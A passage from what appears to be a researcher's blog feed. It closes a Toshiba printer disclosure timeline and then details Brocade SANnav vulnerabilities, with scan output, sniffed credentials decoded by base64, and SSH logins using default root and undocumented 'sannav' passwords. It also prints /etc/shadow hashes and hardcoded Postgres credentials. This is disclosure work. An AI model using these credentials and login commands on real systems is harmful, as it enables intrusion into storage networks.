<li>Nov 22, 2023: Toshiba confirmed that only a small subset of products were previously patched and that CVEs would be public after all the supported models have been patched.</li>
<li>Nov 28, 2023: Toshiba provided an updated Excel file, with new vulnerabilities.</li>
<li>4 Dec, 2023: Additional details were provided to Toshiba regarding new vulnerabilities.</li>
<li>Dec, 2023: Discussions regarding CVSSv3 scores.</li>
<li>Feb 2, 2024: Toshiba confirmed the CVSSv3 scores of the vulnerabilities.</li>
<li>Feb 5, 2024: Toshiba confirmed that the security bulletins would be published around May-June 2024.</li>
<li>May 8, 2024: I asked Toshiba when the advisories would be public.</li>
<li>May 10, 2024: Toshiba confirmed that the advisories would be public by the end of May.</li>
<li>May 14, 2024: Toshiba provided a list of CVEs corresponding to the vulnerabilities I reported and asked to respect the embargo.</li>
<li>May 14, 2024: I confirmed the reception of the CVEs.</li>
<li>May 20, 2024: Toshiba informed that the security advisories would be delayed to mid-June 2024.</li>
<li>May 20, 2024: I confirmed that it was fine for me.</li>
<li>Jun 4, 2024: Toshiba provided a list of affected printers and patched firmware versions.</li>
<li>Jun 14, 2024: Toshiba published a security advisory: <a href="https://www.toshibatec.com/information/20240531_01.html">https://www.toshibatec.com/information/20240531_01.html</a>.</li>
<li>Jun 14, 2024: JPCERT published a security advisory: <a href="https://jvn.jp/en/vu/JVNVU97136265/index.html">https://jvn.jp/en/vu/JVNVU97136265/index.html</a>.</li>
<li>June 27, 2024: A security advisory is published.</li>
</ul>
<h2>Credits</h2>
<p>These vulnerabilities were found by Pierre Barre aka Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
<h2>References</h2>
<p><a href="https://pierrekim.github.io/blog/2024-06-27-toshiba-mfp-40-vulnerabilities.html">https://pierrekim.github.io/blog/2024-06-27-toshiba-mfp-40-vulnerabilities.html</a></p>
<p><a href="https://pierrekim.github.io/advisories/2024-toshiba-mfp.txt">https://pierrekim.github.io/advisories/2024-toshiba-mfp.txt</a></p>
<p><a href="https://www.toshibatec.com/information/20240531_01.html">https://www.toshibatec.com/information/20240531_01.html</a></p>
<p><a href="https://www.toshibatec.com/information/pdf/information20240531_01.pdf">https://www.toshibatec.com/information/pdf/information20240531_01.pdf</a></p>
<p><a href="https://jvn.jp/en/vu/JVNVU97136265/index.html">https://jvn.jp/en/vu/JVNVU97136265/index.html</a></p>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p></content>
    </entry>
    
    <entry>
        <title>18 vulnerabilities in Brocade SANnav</title>
        <link href="2024-04-24-brocade-sannav-18-vulnerabilities.html"/>
        <content type="html"><h2>Product description</h2>
<blockquote>
<p>Brocade's SANnav Management Portal and SANnav Global View empower IT through simplified processes and delivering the right information at the right time.
These tools simplify management by eliminating tedious CLI tasks to manage, monitor, and alert on issues impacting the SAN.
SANnav Management Portal transforms information about SAN behavior and performance into actionable insights, allowing administrators to quickly identify, isolate, and correct problems before they impact the business.</p>
<p>From <a href="https://www.broadcom.com/products/fibre-channel-networking/software/sannav-management-portal">https://www.broadcom.com/products/fibre-channel-networking/software/sannav-management-portal</a></p>
</blockquote>
<h2>Vulnerabilities Summary</h2>
<p>Vulnerable versions: all versions up to 2.3.0 (included).</p>
<p>The summary of the vulnerabilities is:</p>
<ol>
<li><a href="#incorrect-firewall-rules">CVE-2024-4159 - Incorrect firewall rules</a></li>
<li><a href="#lack-of-encryption-for-management-protocol-http">non-assigned CVE vulnerability - Lack of encryption for management protocol (HTTP)</a></li>
<li><a href="#syslog-traffic-sent-in-clear-text">CVE-2024-4161 - Syslog traffic sent in clear-text</a></li>
<li><a href="#insecure-root-access">CVE-2024-29966 - Insecure root access</a></li>
<li><a href="#insecure-sannav-access">non-assigned CVE vulnerability - Insecure sannav access</a></li>
<li><a href="#insecure-ssh-configuration">CVE-2024-2859 - Insecure SSH configuration</a></li>
<li><a href="#suspicious-network-traffic-ignite.apache.org">CVE-2024-29961 - Suspicious network traffic (ignite.apache.org)</a></li>
<li><a href="#lack-of-authentication-in-postgres">non-assigned CVE vulnerability - Lack of authentication in Postgres</a></li>
<li><a href="#insecure-postgres-docker-instance">CVE-2024-29967 - Insecure Postgres Docker instance</a></li>
<li><a href="#insecure-docker-instances">CVE-2024-29967 - Insecure Docker instances</a></li>
<li><a href="#insecure-docker-architecture-and-configuration">CVE-2024-29964 - Insecure Docker architecture and configuration</a></li>
<li><a href="#insecure-backup-process">CVE-2024-29965 - Insecure Backup process</a></li>
<li><a href="#inconsistency-in-firewall-rules">CVE-2024-4159 - Inconsistency in firewall rules</a></li>
<li><a href="#insecure-file-permissions">CVE-2024-29962 - Insecure file permissions</a></li>
<li><a href="#kafka-reachable-on-the-wan-interface-and-lack-of-authentication">CVE-2024-4173 - Kafka reachable on the WAN interface and Lack of authentication</a></li>
<li><a href="#hardcoded-ssh-keys">CVE-2024-29960 - Hardcoded SSH Keys</a></li>
<li><a href="#suspicious-network-traffic-www.gridgain.com">CVE-2024-29961 - Suspicious network traffic (www.gridgain.com)</a></li>
<li><a href="#hardcoded-docker-keys">CVE-2024-29963 - Hardcoded Docker Keys</a></li>
</ol>
<p><em>Miscellaneous notes</em>:</p>
<p>The security assessment was provided in September 2022 to the Brocade support through Dell but it was rejected by Brocade because it didn't address the latest version of SANnav. The tested version was SANNav 2.1.1 at that time (refer to the <a href="#timeline">Timeline</a> for more information).</p>
<p>Luckily, I was able to get access to the latest version of SANnav in May 2023 (the latest version was 2.2.2 then) and confirmed that <u>all the previously rejected vulnerabilities were still present</u> in the version 2.2.2 and as a bonus point, I was able to find 3 additional 0-day vulnerabilities while updating the report. An updated report confirming all the vulnerabilities in the 2.2.2 version was sent to Brocade PSIRT in May 2023 and they finally aknowledged the vulnerabilities.</p>
<p>The patches were released in April 2024, 19 months after Brocade firstly rejected the vulnerabilities and 11 months after Brocade acknowledged the vulnerabilities.</p>
<p><em>Impacts</em></p>
<p>An attacker can compromise a SANNav appliance. After compromising SANNav, it is trivial to compromise Fibre Channel switches. These switches are running Linux and are powerful. They are ideal to host implants.</p>
<p><em>Recommendations</em></p>
<p>Install SANnav 2.3.1.</p>
<p><a id="incorrect-firewall-rules"></a></p>
<h2>Details - Incorrect firewall rules</h2>
<p>By Default, the SANnav VM does not have a firewall:</p>
<pre><code>kali% nmap -sS -sV -v -n -O -p0-65535 10.13.3.7
PORT      STATE  SERVICE     VERSION
22/tcp    open   ssh         OpenSSH 8.0 (protocol 2.0)
80/tcp    open   http        nginx
443/tcp   open   ssl/http    nginx
2377/tcp  open   ssl/swarm?
7946/tcp  open   unknown
18081/tcp open   http        nginx
18082/tcp open   ssl/http    nginx
19094/tcp open   ssl/unknown
kali%
</code></pre>
<p>As shown in <a href="#kafka-reachable-on-the-wan-interface-and-lack-of-authentication">Kafka reachable on the WAN interface and Lack of authentication</a>, an attacker can reach Kafka APIs and send malicious data. The ports <code>18081/tcp</code>, <code>18082/tcp</code> and <code>19094/tcp</code> are only supposed to be reachable from the switches.</p>
<p><code>2377/tcp</code> and <code>7946/tcp</code> are used by Docker for replication.</p>
<p>Furthermore, it was shown that a lot of communications from this appliance was done in clear-text, allowing any machine in the same network to intercept credentials used to manage the Fibre Channel infrastructure. These vulnerabilities are described in:</p>
<ul>
<li><a href="#lack-of-encryption-for-management-protocol-http">Lack of encryption for management protocol (HTTP)</a></li>
<li><a href="#syslog-traffic-sent-in-clear-text">Syslog traffic sent in clear-text</a></li>
</ul>
<p>It is trivial for an attacker to intercept credentials and compromise the entire Fibre Channel infrastructure.</p>
<p>Furthermore, more details regarding the firewall rules can be found in <a href="#inconsistency-in-firewall-rules">Inconsistency in firewall rules</a> showing discrepancy in firewall rules in IPv4 and IPv6.</p>
<p><a id="lack-of-encryption-for-management-protocol-http"></a></p>
<h2>Details - Lack of encryption for management protocol (HTTP)</h2>
<p>By default, the appliance can be installed with these options:</p>
<pre><code>To configure HTTP or HTTPS connections between SANnav Management Portal and SAN switches, select one of the following options:
        0 For HTTP
        1 For HTTPS (SAN switches must be configured for HTTPS connection)
        2 For HTTPS first then HTTP (if HTTPS fails)
</code></pre>
<p>The options 0 and 2: Fall-back to an insecure protocol are insecure. Consequently, an attacker can block HTTPS connections and retrieve the passwords of switches over HTTP.</p>
<p>It was observed that the test SANnav appliance connects to remote switches using a clear-text network protocol (HTTP) if the option 2 is set and the HTTPS traffic is blocked.
This allows an attacker to retrieve passwords of devices by sniffing the network.</p>
<pre><code>09:04:57.406608 IP 10.13.3.7.59090 &gt; 10.13.3.8.http: Flags [P.], seq 1:274, ack 1, win 229, options [nop,nop,TS val 96789859 ecr 3236098423], length 273: HTTP: GET /authenticate.html HTTP/1.1
        0x0000:  ffff ffff ffff ffff ffff ffff ffff ffff  ................
        0x0010:  ffff ffff ffff ffff ffff ffff ffff ffff  ................
        0x0020:  ffff ffff ffff ffff ffff ffff ffff ffff  ................
        0x0030:  ffff ffff 4745 5420 2f61 7574 6865 6e74  ...wGET./authent
        0x0040:  6963 6174 652e 6874 6d6c 2048 5454 502f  icate.html.HTTP/
        0x0050:  312e 310d 0a55 7365 722d 4167 656e 743a  1.1..User-Agent:
        0x0060:  2053 414e 6e61 764d 502d 322e 312e 312d  .SANnavMP-2.1.1-
        0x0070:  7065 7266 6d6f 6e2d 6d77 0d0a 4175 7468  perfmon-mw..Auth
        0x0080:  6f72 697a 6174 696f 6e3a 2043 7573 746f  orization:.Custo
        0x0090:  6d5f 4261 7369 6320 ffff ffff ffff ffff  m_Basic.....[REM
        0x00a0:  ffff ffff ffff ffff ffff ffff 0d0a 4361  OVEDREMOVED]....
        0x00b0:  6368 652d 436f 6e74 726f 6c3a 206e 6f2d  che-Control:.no-
        0x00c0:  6361 6368 650d 0a50 7261 676d 613a 206e  cache..Pragma:.n
        0x00d0:  6f2d 6361 6368 650d 0a48 6f73 743a 20ff  o-cache..Host:.[
        0x00e0:  ffff ffff ffff ffff ffff ffff 0a41 6363  REMOVEDREMO].Acc
        0x00f0:  6570 743a 2074 6578 742f 6874 6d6c 2c20  ept:.text/html,.
        0x0100:  696d 6167 652f 6769 662c 2069 6d61 6765  image/gif,.image
        0x0110:  2f6a 7065 672c 202a 3b20 713d 2e32 2c20  /jpeg,.*;.q=.2,.
        0x0120:  2a2f 2a3b 2071 3d2e 320d 0a43 6f6e 6e65  */*;.q=.2..Conne
        0x0130:  6374 696f 6e3a 206b 6565 702d 616c 6976  ction:.keep-aliv
        0x0140:  650d 0a0d 0a                             e....
</code></pre>
<p>Since the credentials are just base64-encoded, it is possible to decrypt them:</p>
<pre><code>kali% echo YWRtaW46YWR2aXNvcnk= | base64 -d;echo 
admin:advisory
</code></pre>
<p>Using stolen credentials, it is possible to SSH the Brocade switches:</p>
<pre><code>kali% sshpass -p 'advisory' ssh -l admin 10.13.3.8
Warning: SSH client configured for wide compatibility by kali-tweaks.
SWITCH:admin&gt;
</code></pre>
<p><a id="syslog-traffic-sent-in-clear-text"></a></p>
<h2>Details - Syslog traffic sent in clear-text</h2>
<p>The SANnav appliance receives syslog datagrams from the Brocade switches.</p>
<p>When sniffing the network, this traffic is sent in clear-text as shown below:</p>
<pre><code>[root@sannav-portal-v211 shm]# tcpdump -n -ttt -i ens192
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on ens192, link-type EN10MB (Ethernet), capture size 262144 bytes
 00:00:00.893850 IP 10.13.3.142.47170 &gt; 10.13.3.7.syslog: SYSLOG local7.info, length: 297
 00:00:00.216601 IP 10.13.3.43.45881 &gt; 10.13.3.7.syslog: SYSLOG local7.info, length: 300
 00:00:00.403197 IP 10.13.3.140.48980 &gt; 10.13.3.7.syslog: SYSLOG local7.info, length: 297
 00:00:02.303478 IP 10.13.3.142.47170 &gt; 10.13.3.7.syslog: SYSLOG local7.info, length: 273
 00:00:00.397072 IP 10.13.3.140.48980 &gt; 10.13.3.7.syslog: SYSLOG local7.info, length: 273
 00:00:00.144829 IP 10.13.3.63.57717 &gt; 10.13.3.7.syslog: SYSLOG local7.info, length: 294
</code></pre>
<p>When analyzing the packets, it appears there is no authentication and no encryption at all (the packet has been redacted):</p>
<pre><code>[root@sannav-portal-v211 shm]# tcpdump -n -ttt -s0 -X -i ens192 port 514
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on ens192, link-type EN10MB (Ethernet), capture size 262144 bytes
 00:00:00.000000 IP 10.13.3.163.33117 &gt; 10.13.3.7.syslog: SYSLOG local7.info, length: 301
        0x0000:  ffff ffff ffff ffff ffff ffff ffff ffff  ................
        0x0010:  ffff ffff ffff ffff ffff ffff ffff ffff  ................
        0x0020:  3e41 7567 2020 3220 3130 3a35 373a 3533  &gt;Aug..2.10:57:53
        0x0030:  ffff ffff ffff ffff ffff ffff ffff ffff  [REMOVEDREMOVED]
        0x0040:  7261 736c 6f67 643a 2041 5544 4954 2c20  raslogd:.AUDIT,.
        0x0050:  3230 3232 2f30 382f 3032 2d31 303a 3537  2022/08/02-10:57
        0x0060:  3a35 3320 2847 4d54 292c 205b 5345 432d  :53.(GMT),.[SEC-
 [...]
</code></pre>
<p><a id="insecure-root-access"></a></p>
<h2>Details - Insecure root access</h2>
<p>There are backdoor credentials for 2 users: <code>root</code> (documented) and <code>sannav</code> (undocumented).</p>
<p>When reading the documentation of SANnav, it appears the root password of the appliance is publicly known:</p>
<p><a href="https://techdocs.broadcom.com/us/en/fibre-channel-networking/sannav/management-portal-installation-and-migration/2-2-0x/SANnav-Management-Portal-OVA-Deployment/Installation-Prerequisites-for-SANnav-Management-Portal-Appliance.html">https://techdocs.broadcom.com/us/en/fibre-channel-networking/sannav/management-portal-installation-and-migration/2-2-0x/SANnav-Management-Portal-OVA-Deployment/Installation-Prerequisites-for-SANnav-Management-Portal-Appliance.html</a>:</p>
<p><img alt="" src="images/2024-sannav-credentials.png" /></p>
<p>Using this password, it is possible to get a root access to the appliance:</p>
<pre><code>kali% sshpass -p 'SANnav!@#' ssh -l root 10.13.3.7
Warning: SSH client configured for wide compatibility by kali-tweaks.
Activate the web console with: systemctl enable --now cockpit.socket

Last failed login: Mon Aug 28 09:50:36 from 10.13.3.10 on ssh:notty
Last login: Mon Aug 28 09:56:36 2022 from 10.13.3.10

__        __   _                            _
\ \      / /__| | ___ ___  _ __ ___   ___  | |_ ___
 \ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \
  \ V  V /  __/ | (_| (_) | | | | | |  __/ | || (_) |
   \_/\_/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/


 ____    _    _   _                     ____    _   _ 
/ ___|  / \  | \ | |_ __   __ ___   __ |___ \  / | / |
\___ \ / _ \ |  \| | '_ \ / _` \ \ / /   __) | | | | |
 ___) / ___ \| |\  | | | | (_| |\ V /   / __/ _| |_| |
|____/_/   \_\_| \_|_| |_|\__,_| \_/   |_____(_)_(_)_|



--------------- WARNING ---------------
This system is the use of authorized users only. Individuals using this computer system without authority or in excess of their authority are subject to having all their activities on this system monitored and recorded by system personnel. Any one using this system expressly consents to such monitoring and is advised that if such monitoring reveals possible evidence of criminal activity system personal may provide the evidence of such monitoring to law enforcement officials.
---------------------------------------

===============================================
 - Hostname.................: sannav-portal-v211
 - IP Address...............: 10.13.3.7
 - Disk Space Available.....: 531G (Use%: 6%)
===============================================
 - CPU usage................: 4.03, 4.09, 3.74 (1, 5, 15 min)
 - Memory used..............: 52295 MB / 48127 MB
 - Swap in use..............: 8312 MB
===============================================

[root@sannav-portal-v211 ~]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@sannav-portal-v211 ~]#
</code></pre>
<p><a id="insecure-sannav-access"></a></p>
<h2>Details - Insecure sannav access</h2>
<p>When checking the <code>/etc/shadow</code> file, the <code>sannav</code> user will appear:</p>
<pre><code>[root@sannav-portal-v211 sannav]# cat /etc/shadow
root:$6$sOk3vCRnZ8/3ktGs$rAN6y8px8b2soJTkXKaqiYoNsySD3zcv2AINgSM6W9WZiMzq08j11By3..PRs4TbkKSs8z.lf1B/WDA4A0YcD1:18246:0:99999:7:::
bin:*:18027:0:99999:7:::
daemon:*:18027:0:99999:7:::
adm:*:18027:0:99999:7:::
lp:*:18027:0:99999:7:::
sync:*:18027:0:99999:7:::
shutdown:*:18027:0:99999:7:::
halt:*:18027:0:99999:7:::
mail:*:18027:0:99999:7:::
operator:*:18027:0:99999:7:::
games:*:18027:0:99999:7:::
ftp:*:18027:0:99999:7:::
nobody:*:18027:0:99999:7:::
dbus:!!:18212::::::
systemd-coredump:!!:18212::::::
systemd-resolve:!!:18212::::::
tss:!!:18212::::::
polkitd:!!:18212::::::
unbound:!!:18212::::::
libstoragemgmt:!!:18212::::::
cockpit-ws:!!:18212::::::
setroubleshoot:!!:18212::::::
sssd:!!:18212::::::
insights:!!:18212::::::
sshd:!!:18212::::::
chrony:!!:18212::::::
tcpdump:!!:18212::::::
sannav:$6$LLVc84Gp9XhvWARX$WTvmfjO.DCFmjYGObezs914kHaveB9bkBARaINH/31otV.HoDQ/7H8SdPDCOfNexvh274ZccC8Unz7p9KGuDG1:18246:0:99999:7:::
cockpit-wsinstance:!!:18471::::::
rngd:!!:18471::::::
[root@sannav-portal-v211 sannav]#
</code></pre>
<p>Testing the previous password (<code>SANnav!@#</code>) with the user <code>sannav</code> will work, although it is undocumented:</p>
<pre><code>kali% sshpass -p 'SANnav!@#' ssh -l sannav 10.13.3.7

Warning: SSH client configured for wide compatibility by kali-tweaks.
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Mon Aug 28 09:59:36 2022 from 10.13.3.10

__        __   _                            _                                                                                                                                                                                                
\ \      / /__| | ___ ___  _ __ ___   ___  | |_ ___                                                                                                                                                                                          
 \ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \                                                                                                                                                                                         
  \ V  V /  __/ | (_| (_) | | | | | |  __/ | || (_) |                                                                                                                                                                                        
   \_/\_/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/


 ____    _    _   _                     ____    _   _                                                                                                                                                                                        
/ ___|  / \  | \ | |_ __   __ ___   __ |___ \  / | / |                                                                                                                                                                                       
\___ \ / _ \ |  \| | '_ \ / _` \ \ / /   __) | | | | |                                                                                                                                                                                       
 ___) / ___ \| |\  | | | | (_| |\ V /   / __/ _| |_| |                                                                                                                                                                                       
|____/_/   \_\_| \_|_| |_|\__,_| \_/   |_____(_)_(_)_|



--------------- WARNING ---------------
This system is the use of authorized users only. Individuals using this computer system without authority or in excess of their authority are subject to having all their activities on this system monitored and recorded by system personnel. Any one using this system expressly consents to such monitoring and is advised that if such monitoring reveals possible evidence of criminal activity system personal may provide the evidence of such monitoring to law enforcement officials.
---------------------------------------

===============================================
 - Hostname.................: sannav-portal-v211
 - IP Address...............: 10.13.3.7
 - Disk Space Available.....: 531G (Use%: 6%)
===============================================
 - CPU usage................: 0.31, 0.45, 0.58 (1, 5, 15 min)
 - Memory used..............: 52776 MB / 48127 MB
 - Swap in use..............: 10031 MB
===============================================

[sannav@sannav-portal-v211 ~]$ id
uid=1000(sannav) gid=1000(sannav) groups=1000(sannav),10(wheel),1001(docker) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[sannav@sannav-portal-v211 ~]$
</code></pre>
<p><a id="insecure-ssh-configuration"></a></p>
<h2>Details - Insecure SSH configuration</h2>
<p>When reviewing the configuration of the appliance, it was noted that root access is allowed by default and several insecure options are set in the <code>/etc/ssh/sshd_config</code> OpenSSH configuration file:</p>
<pre><code>1 #       $OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $
2 
3 # This is the sshd server system-wide configuration file.  See
4 # sshd_config(5) for more information.
5 
6 # This sshd was compiled with PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin
[...]
45 #LoginGraceTime 2m
46 PermitRootLogin yes
47 #StrictModes yes
48 #MaxAuthTries 6
49 #MaxSessions 10
[...]
70 # To disable tunneled clear text passwords, change to no here!
71 #PasswordAuthentication yes 
72 #PermitEmptyPasswords no
73 PasswordAuthentication yes
[...]
86 # GSSAPI options
87 GSSAPIAuthentication yes
88 GSSAPICleanupCredentials no
89 #GSSAPIStrictAcceptorCheck yes
</code></pre>
<p>On line 46, root access is allowed.</p>
<p>On line 73, authentication using password-only is allowed.</p>
<p>On line 88, this option specifies whether openssh would destroy the user's credentials cache on logout.  The default is yes.</p>
<p><a id="suspicious-network-traffic-ignite.apache.org"></a></p>
<h2>Details - Suspicious network traffic (ignite.apache.org)</h2>
<p>It was observed that the SANnav appliance regularly sends HTTPS requests to ignite.apache.org at a small interval.
The appliance will do a DNS resolution for <code>ignite.apache.org</code> and then will send a HTTPS request as shown below:</p>
<pre><code>[root@sannav-portal-v211 shm]# tcpdump -n -ttt -i ens192
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on ens192, link-type EN10MB (Ethernet), capture size 262144 bytes
 00:00:00.051269 IP 10.13.3.7.45844 &gt; 1.1.1.1.domain: 49175+ A? ignite.apache.org. (35)
 00:00:00.000035 IP 10.13.3.7.45844 &gt; 1.1.1.1.domain: 49175+ A? ignite.apache.org. (35)
 00:00:00.000818 IP 1.1.1.1.domain &gt; 10.13.3.7.45844: 49175 1/0/0 A 151.101.2.132 (51)
 00:00:00.000163 IP 10.13.3.7.40210 &gt; 151.101.2.132.https: Flags [S], seq 3104261383, win 29200, options [mss 1460,sackOK,TS val 3912020309 ecr 0,nop,wscale 7], length 0
 00:00:00.002841 IP 151.101.2.132.https &gt; 10.13.3.7.40210: Flags [S.], seq 1079142995, ack 3104261384, win 65535, options [mss 1460,sackOK,TS val 3131823674 ecr 3912020309,nop,wscale 9], length 0
 00:00:00.000046 IP 10.13.3.7.40210 &gt; 151.101.2.132.https: Flags [.], ack 1, win 229, options [nop,nop,TS val 3912020312 ecr 3131823674], length 0
 00:00:00.000635 IP 10.13.3.7.40210 &gt; 151.101.2.132.https: Flags [P.], seq 1:220, ack 1, win 229, options [nop,nop,TS val 3912020313 ecr 3131823674], length 219
 00:00:00.002455 IP 151.101.2.132.https &gt; 10.13.3.7.40210: Flags [.], ack 220, win 285, options [nop,nop,TS val 3131823677 ecr 3912020313], length 0
 00:00:00.003665 IP 1.1.1.1.domain &gt; 10.13.3.7.45844: 49175 1/0/0 A 151.101.2.132 (51)
 00:00:00.003968 IP 151.101.2.132.https &gt; 10.13.3.7.40210: Flags [.], seq 1:1449, ack 220, win 285, options [nop,nop,TS val 3131823683 ecr 3912020313], length 1448
 00:00:00.000026 IP 10.13.3.7.40210 &gt; 151.101.2.132.https: Flags [.], ack 1449, win 251, options [nop,nop,TS val 3912020323 ecr 3131823683], length 0
 00:00:00.000014 IP 151.101.2.132.https &gt; 10.13.3.7.40210: Flags [.], seq 1449:2897, ack 220, win 285, options [nop,nop,TS val 3131823683 ecr 3912020313], length 1448
 00:00:00.000018 IP 10.13.3.7.40210 &gt; 151.101.2.132.https: Flags [.], ack 2897, win 274, options [nop,nop,TS val 3912020323 ecr 3131823683], length 0
 00:00:00.000004 IP 151.101.2.132.https &gt; 10.13.3.7.40210: Flags [.], seq 2897:4345, ack 220, win 285, options [nop,nop,TS val 3131823683 ecr 3912020313], length 1448
 00:00:00.000008 IP 10.13.3.7.40210 &gt; 151.101.2.132.https: Flags [.], ack 4345, win 296, options [nop,nop,TS val 3912020323 ecr 3131823683], length 0
 00:00:00.000004 IP 151.101.2.132.https &gt; 10.13.3.7.40210: Flags [P.], seq 4345:4471, ack 220, win 285, options [nop,nop,TS val 3131823683 ecr 3912020313], length 126
 00:00:00.000008 IP 10.13.3.7.40210 &gt; 151.101.2.132.https: Flags [.], ack 4471, win 296, options [nop,nop,TS val 3912020323 ecr 3131823683], length 0
 00:00:00.002553 IP 10.13.3.7.40210 &gt; 151.101.2.132.https: Flags [P.], seq 220:295, ack 4471, win 296, options [nop,nop,TS val 3912020326 ecr 3131823683], length 75
 00:00:00.001564 IP 151.101.2.132.https &gt; 10.13.3.7.40210: Flags [.], ack 295, win 285, options [nop,nop,TS val 3131823689 ecr 3912020326], length 0
 00:00:00.000579 IP 10.13.3.7.40210 &gt; 151.101.2.132.https: Flags [P.], seq 295:301, ack 4471, win 296, options [nop,nop,TS val 3912020328 ecr 3131823689], length 6
 00:00:00.000071 IP 10.13.3.7.40210 &gt; 151.101.2.132.https: Flags [P.], seq 301:346, ack 4471, win 296, options [nop,nop,TS val 3912020328 ecr 3131823689], length 45
 00:00:00.000536 IP 151.101.2.132.https &gt; 10.13.3.7.40210: Flags [R.], seq 4471, ack 301, win 296, length 0
</code></pre>
<p>Such behavior was not understood.</p>
<p><a id="lack-of-authentication-in-postgres"></a></p>
<h2>Details - Lack of authentication in Postgres</h2>
<p>It was observed that Postgres is running inside the appliance.</p>
<p>Postgres is reachable from any Docker instance.</p>
<p>Postgres do not implement authentication.</p>
<p>When reversing the <code>fe-consolidation-service2-1.0.0.jar</code> JAR package found in the appliance, it was found out that Postgres doesn't use authentication. Hardcoded postgres credentials can be found (<code>dcmadmin</code> without password):</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">1</span> <span style="color: #008000; font-weight: bold">package</span> <span style="color: #0000FF; font-weight: bold">com.brocade.dcm.supportsave.constants</span><span style="color: #666666">;</span>
 <span style="color: #666666">2</span> 
 <span style="color: #666666">3</span> <span style="color: #008000; font-weight: bold">import</span> <span style="color: #0000FF; font-weight: bold">com.brocade.dcm.fault.common.util.DBConstants</span><span style="color: #666666">;</span>
 <span style="color: #666666">4</span> <span style="color: #008000; font-weight: bold">import</span> <span style="color: #0000FF; font-weight: bold">com.brocade.dcm.fault.common.util.FaultCommonConstants</span><span style="color: #666666">;</span>
 <span style="color: #666666">5</span> <span style="color: #008000; font-weight: bold">import</span> <span style="color: #0000FF; font-weight: bold">java.io.File</span><span style="color: #666666">;</span>
 <span style="color: #666666">6</span> <span style="color: #008000; font-weight: bold">import</span> <span style="color: #0000FF; font-weight: bold">org.apache.http.util.VersionInfo</span><span style="color: #666666">;</span>
 <span style="color: #666666">7</span> <span style="color: #008000; font-weight: bold">import</span> <span style="color: #0000FF; font-weight: bold">org.springframework.beans.factory.xml.BeanDefinitionParserDelegate</span><span style="color: #666666">;</span>
 <span style="color: #666666">8</span> 
 <span style="color: #666666">9</span> <span style="color: #666666">/*</span> loaded from<span style="color: #666666">:</span> fe<span style="color: #666666">-</span>consolidation<span style="color: #666666">-</span>service2<span style="color: #666666">-1.0.0.</span><span style="color: #7D9029">jar</span><span style="color: #666666">:</span>BOOT<span style="color: #666666">-</span>INF<span style="color: #666666">/</span>lib<span style="color: #666666">/</span>supportsave<span style="color: #666666">-</span>common<span style="color: #666666">-1.0.0.</span><span style="color: #7D9029">jar</span><span style="color: #666666">:</span>com<span style="color: #666666">/</span>brocade<span style="color: #666666">/</span>dcm<span style="color: #666666">/</span>supportsave<span style="color: #666666">/</span>constants<span style="color: #666666">/</span>CommonConstants<span style="color: #666666">.</span><span style="color: #7D9029">class</span> <span style="color: #666666">*</span>    <span style="color: #666666">/</span>
<span style="color: #666666">10</span> <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">class</span> <span style="color: #0000FF; font-weight: bold">CommonConstants</span> <span style="color: #666666">{</span>
<span style="color: #666666">11</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">static</span> <span style="color: #008000; font-weight: bold">final</span> String TAG_AUTHORIZATION <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;Authorization&quot;</span><span style="color: #666666">;</span>
<span style="color: #666666">[...]</span>
<span style="color: #666666">28</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">static</span> <span style="color: #008000; font-weight: bold">final</span> String SS_LOGS_ONLY<span style="color: #666666">;</span>
<span style="color: #666666">29</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">static</span> <span style="color: #008000; font-weight: bold">final</span> String SS_PARTAIL_DB<span style="color: #666666">;</span>
<span style="color: #666666">30</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">static</span> <span style="color: #008000; font-weight: bold">final</span> String SS_FULL_DB<span style="color: #666666">;</span>
<span style="color: #666666">31</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">static</span> <span style="color: #008000; font-weight: bold">final</span> String SS_LOGS_ONLY_GV<span style="color: #666666">;</span>
<span style="color: #666666">32</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">static</span> <span style="color: #008000; font-weight: bold">final</span> String SS_PARTAIL_DB_GV<span style="color: #666666">;</span>
<span style="color: #666666">33</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">static</span> <span style="color: #008000; font-weight: bold">final</span> String SS_FULL_DB_GV<span style="color: #666666">;</span>
<span style="color: #666666">34</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">static</span> <span style="color: #008000; font-weight: bold">final</span> String USERNAME <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;dcmadmin&quot;</span><span style="color: #666666">;</span>
<span style="color: #666666">35</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">static</span> <span style="color: #008000; font-weight: bold">final</span> String PASSWORD <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;&quot;</span><span style="color: #666666">;</span>
